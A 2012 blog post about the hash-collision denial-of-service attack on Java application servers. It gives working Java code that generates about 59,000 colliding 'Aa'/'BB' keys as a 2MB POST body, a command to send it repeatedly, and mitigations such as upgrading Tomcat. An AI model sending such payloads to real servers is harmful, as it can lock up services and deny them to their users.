---
title: Hash collisions are a hell of a thing
date: 2012-03-08
published: true
---

A few months ago, Julian Wälde and Alexander Klink presented at [28C3](http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html) about an exploit that can cause a server to see 99% CPU utilization. I hadn't heard of the attack until a coworker of mine showed me the [nruns article on the subject](http://www.nruns.com/_downloads/advisory28122011.pdf). We decided to have a little fun and see what we could do. This blog will show how to use a version of Julian and Alexander's attack in Java.

## A new attack you say?

Actually, not quite. This attack was identified back in 2003, but it seems like it just disappeared even though just about every language has this weakness, since most of them use hashtables for POST parameters. Note that this isn't even a distributed DoS! And that's not even the best part - with any half-decent residential connection, you can likely transmit enough data to lock down _entire servers._ And no, I didn't add an extra s to servers!

## Hash collisions?

The way many application servers work (from here on out I'll focus on Java and Apache Tomcat, but this theory applies to many) when you submit parameters in a POST is to put them in a hash table. The default limit for POST request sizes is generally 2MB. What we'll do next is show how to generate a message to bring a server to its knees.

## Non randomized hashcode functions are bad, mmk?

The details of how Java hashcode works boils down to using DJBX33A with mutliplication constant 31 and a start value of 0, and if you're interested, some Googling will show you details. For our purposes, it's enough to know that the (extremely short) strings "Aa" and "BB" hash to the same value. ("C#" shares the hash too, but we'll ignore it for our purposes) Even more importantly, there's an easy way to generate permutations of these two tokens that will share a hash as well! Considering we have 2MB to work with, some math will show us that if we use 32-character long strings, we will be able to get a query constructed that causes _65,536_ keys to hash to the same value! Since we're using 2 character tokens, the number of permutations can be calculated with the formula 2^n, where n is the number of spots (16 in our case).

## You found colliding hashes! Congratulations!

The key is that you're generating ~65k keys that _ALL_ hash to the same value, which makes processing take ridiculous amounts of time. My residential internet that costs less than $40 a month has 250KB/s upload. Trasmitting a 2MB POST at this rate takes a whopping eight seconds. So how long does this POST take to process? Inserting into a HashMap that has a key collision takes O(n^2) time. Since every single key we generate will collide, that's 65k^2, which is a lot of comparisons.

## Stop talking, show me some cool stuff already

Well, fine!

```java
String[] tokens = {"Aa", "BB"};

int spots = 16;

// We'll keep track of permutations per "level" (amount of tokens)
List<String>[] permutations = new ArrayList[spots];
for (int i = 0; i < permutations.length; i++) {
  permutations[i] = new ArrayList<String>();
}

// The first level of tokens is just "Aa" and "BB"
for (int j = 0; j < 2; j++) {
  permutations[0].add(tokens[j]);
}

// Generate all combinations with duplicates
// First level: AaAa AaBB BBAa BBBB
// Second level: AaAaAa AaAaBB AaBBAa AaBBBB ....
for (int i = 1; i < spots; i++) {
  for (String permutation : permutations[i-1]) {
    // Yo dawg, I heard you like loops
    for (int j = 0; j < 2; j++) {
      String newPermutation = permutation + tokens[j];
      permutations[i].add(newPermutation);
    }
  }
}

for (int i = 0; i < 59000; i++) {
  System.out.println(permutations[permutations.length - 1].get(i) + "=1&");
}
```

Like I mentioned earlier, Java's hashing has an interesting property here. At any given level, EVERY combination generated will hash to the exact same thing. At the 16th level (32 bytes per key), we have 2^16 (65,536) combinations to work with. This gives us just over 2MB of keys. However, we can't just submit a list of keys; we need values to tie them to. The smallest number of bytes then is is 35, which would be `<key>=1&`. So, 2^16 \* 32 / 35 = 59,918. Leaving some extra room for fun, let's call it 59,000 keys. So now, you can generate a POST that's just at 2MB for our particular attack. Save that to a file, and then run:

    lwp-request -m POST localhost < attack.txt

at some interval. Congratulations on DoSing just about every Java application server on the Internet! I tried this locally, and with 59,000 arguments running through a Spring application, I locked one of my four cores at 100% for...

wait for it...

well, I don't actually know. I got tired of waiting after **10 minutes** had passed. I didn't have my laptop's power cable at home, and my battery was about to run out. However, it utilized 100% of the a core for at LEAST ten minutes. I'm tempted to try this on a production box, but I've been able to successfully channel my inner Good Guy Greg and refrain so far.

## Now what?

Excellent question! If you're running Tomcat, upgrade to either 7.0.23 or 6.0.35. These will limit the number of POST parameters to 10k, which Apache claims is small emough to prevent this attack. The article mentions a couple of other workarounds as well. The moral of the story is you <s>can't trust the system</s> should go make sure your application servers are up to date or implement a work around!

## Java sucks and you're a bad person!

Okay :(

## What about other languages?

A 2MB POST takes SIX HOURS to parse in Ruby! Python by default limits POSTs to 1MB, but that still takes 7 minutes to parse! This is pretty much language agnostic if you can figure out a way to generate colliding hashes!

## Extra credit

Careful readers will have noted the third colliding hash in the Java example ("C#"). As it turns out, you can do an attack with 3^n collisions instead of the one I demonstrated above at 2^n! This is obviously better as you can fit more (shorter) colliding keys into the same amount of space (2MB). For the theory behind that, definitely go check out the [original presentation](http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html) and [nruns' great article](http://www.nruns.com/_downloads/advisory28122011.pdf).
